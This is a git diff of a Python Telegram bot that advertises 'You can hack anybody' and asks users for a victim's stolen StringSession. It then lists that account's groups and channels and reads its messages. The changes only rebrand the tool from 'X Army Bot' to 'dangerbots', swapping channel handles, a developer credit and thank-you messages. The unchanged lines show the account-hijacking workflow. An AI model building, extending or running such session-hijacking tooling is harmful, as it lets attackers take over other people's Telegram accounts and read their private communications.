@@ -146,11 +146,11 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "TheXArmy"
+channel = "danger_bots"
 menu = '''
 
-**NOTICE JOIN @TheXArmy FEDERATION**
-FED ID `2936f6a8-cc1d-4f76-ac1f-ac752fe5caef`
+**NOTICE JOIN :-@danger
+
 
 
 A: [check user own groups and channels]
@@ -185,6 +185,7 @@ mm = '''
 You can hack anybody
 Take his StringSession and use me
 I will give you full power of mine
+⚡️devoleper⚡️:- [𝗔𝗻𝗼𝗻𝘆𝗺𝗼𝘂𝘀么𝗸𝗶𝗱](https://t.me/danger_of_telegram)
 Type /hack
 '''
 @client.on(events.NewMessage(pattern="/start"))
@@ -243,7 +244,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nThanks For using dangerbots")
     elif r == "C":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -265,7 +266,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using X Army Bot")
+      await event.reply(i + "\n\nThanks For using dangerbots")
     elif r == "E":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -388,7 +389,7 @@ async def start(event):
         else:
           await event.respond("Something is wrong")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @sessionhack_chat\n**LOGS**\n" + str(e))
+        await event.respond("SEND THIS ERROR TO - @dangerbots\n**LOGS**\n" + str(e))
 
     else:
       await event.respond("Wrong Text Found Re type /hack and use")
